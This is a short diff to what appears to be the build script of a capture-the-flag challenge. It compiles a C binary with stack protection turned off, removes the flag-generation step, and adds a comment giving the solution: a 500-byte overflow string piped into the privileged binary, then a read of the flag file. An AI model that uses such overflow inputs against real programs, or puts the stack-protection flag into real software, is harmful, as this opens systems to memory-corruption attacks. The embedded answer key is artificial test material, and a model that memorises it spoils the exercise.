@@ -1,8 +1,10 @@
 #!/bin/bash
 
-generate-flag --output /challenge/end/flag.txt
-
 # Parse the template and compile the challenge
 parse-template template.c \
             -c "gcc challenge.c -Wall -o challenge -fno-stack-protector" \
             -o challenge.c
+
+# solution:
+# $ (python3 -c "print('A'*500)"; cat -) | sudo -u step1 ./challenge/step1/challenge
+# $ cat /challenge/end/flag
